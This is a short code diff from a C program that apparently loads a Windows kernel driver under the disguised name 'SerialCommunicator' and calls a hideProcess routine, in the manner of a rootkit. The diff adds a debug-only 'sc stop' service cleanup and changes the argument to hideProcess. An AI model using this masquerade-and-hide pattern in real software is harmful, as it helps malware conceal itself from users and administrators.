@@ -47,10 +47,12 @@ int main(int argc, char *argv[])
 	char* displayName = "SerialCommunicator"; // friendly name
 #ifdef DEBUG
 	char buff[200];
+	sprintf(buff, "sc stop %s", driverName);
+	system(buff);
 	sprintf(buff, "sc delete %s", driverName);
 	system(buff);
 #endif
-	if (loadSysFile(driverName, displayName) && hideProcess(driverName, 4/*(int)argv[1]*/)) //(int)argv[1]);)//"friendly driver"))//argv[1]);
+	if (loadSysFile(driverName, displayName) && hideProcess(displayName/*driverName*/, 4/*(int)argv[1]*/)) //(int)argv[1]);)//"friendly driver"))//argv[1]);
 		printf("success\n");
 	else
 		printf("failure\n");
